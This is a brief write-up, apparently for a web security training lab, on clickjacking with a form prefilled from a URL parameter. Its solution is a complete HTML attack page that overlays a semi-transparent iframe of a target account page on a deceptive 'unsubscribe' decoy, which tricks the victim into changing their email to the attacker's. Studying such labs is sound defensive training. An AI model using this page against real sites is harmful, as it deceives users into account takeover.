# Lab: Clickjacking with form input data prefilled from a URL parameter
## Description
By adding adding `?email=hacker@hack.com` to the iframe src url, the form will be filled automatically.

## Solution
```html
<head>
  <style>
    #target_website {
      position:relative;
      width:528px;
      height:600px;
      opacity:0.60001;
	  margin-bottom: 200px;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
	  top:400px;
	  left:45px;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>

<body>
	<div id="decoy_website">
		<p style="height: 25px;">Enter your email below to unsubscribe...</p>
		<input type="email" name="email" value="" style="height:30; width: 400px;">
		<br /><br /><br />
		<button style="width: 140px; height:25px;">Click here!</button>
	</div>
	<iframe id="target_website" src="https://target.web-security-academy.net/my-account?email=hacker@hack.com"></iframe>
</body>
```
